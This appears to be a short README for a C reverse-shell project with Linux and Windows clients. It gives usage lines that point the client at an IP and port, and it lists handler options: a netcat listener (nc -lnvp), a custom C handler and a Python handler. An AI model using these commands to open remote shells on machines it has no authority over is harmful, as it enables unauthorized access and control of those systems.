# SimpleReverseShellC

This is a simple Reverse Shell written for linux platform execution.

## Client Usage:

./linuxClient [IP] [PORT]

windowsClient.exe [IP] [PORT]

Where [IP] and [PORT] will default to the default defines if no paramters are passed.


## Handler Usage Options:

### NetCat Handling:
nc -lnvp [PORT]

### Custom C Handler:
./hander [PORT]

### Custom Python Handler (pyHandler):

python3 pyhandler.py


### WINDOWS CLIENT MUST BE HANDLED WITH NETCAT CURRENTLY... custom handler module for SchruteFarms to be written
